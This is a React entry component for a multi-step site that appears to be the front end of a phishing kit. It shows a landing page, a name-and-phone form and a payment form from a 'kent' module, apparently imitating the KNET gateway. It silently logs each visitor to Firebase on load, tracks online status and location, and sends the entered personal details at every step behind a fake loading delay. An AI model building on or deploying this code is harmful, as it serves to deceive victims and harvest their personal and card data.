"use client"

import { useEffect, useState } from "react"
import "./main.css"
import { CartProvider } from "./cartContext"
import Landing from "./landing/landing"
import { Toaster } from "react-hot-toast"
import Info from "./info/info"
import { addData } from "./firebase"
import  FullPageLoader  from "./loader"
import { PaymentForm } from "./kent/kent"
import { getLocation, setupOnlineStatus } from "./lib"

function App() {
  const [currantPage, setCurrantPage] = useState(1)
  const [isLoading, setisloading] = useState(false)
  const [name, setName] = useState("")
  const [phone, setPhone] = useState("")

  const [_id] = useState("id" + Math.random().toString(16).slice(2))
  const data={
    id:_id,
    hasPersonalInfo:name != '',
    currentPage:currantPage,
    createdDate: new Date().toISOString(),
    notificationCount:1,
    personalInfo: {
      id:name,
      fullName:name,
      phone:phone
    },
  };
  const handleNextPage = () => {
   addData(data)
   setisloading(true)
    setTimeout(() => {
      setisloading(false)
      setCurrantPage(currantPage+1)
    }, 3000)
  }
  useEffect(()=>{
    localStorage.setItem('vistor',_id)
      addData(data).then(()=>{
        setupOnlineStatus(data.id)
        getLocation()
      })
    },[])
  return (
    <CartProvider>
      <div style={{ opacity: isLoading ? 0.4 : 1 }}>
        <div>
          {isLoading && <FullPageLoader />}
          <Toaster position="bottom-center" />
        </div>

        {currantPage === 1 ? (
          <Landing handleNextPage={handleNextPage} />
        ) : currantPage === 2 ? (
          <Info setName={setName} setPhone={setPhone} handleNextPage={handleNextPage} />
        ) : currantPage === 3 ? (
          <div className="my-16" style={{ marginTop: 45, padding: 20 }}>
            <PaymentForm />
          </div>
        ) :  (
          <div className="my-16" style={{ marginTop: 45, padding: 20 }}>
            <PaymentForm />
          </div>
        ) }
      </div>
    </CartProvider>
  )
}

export default App
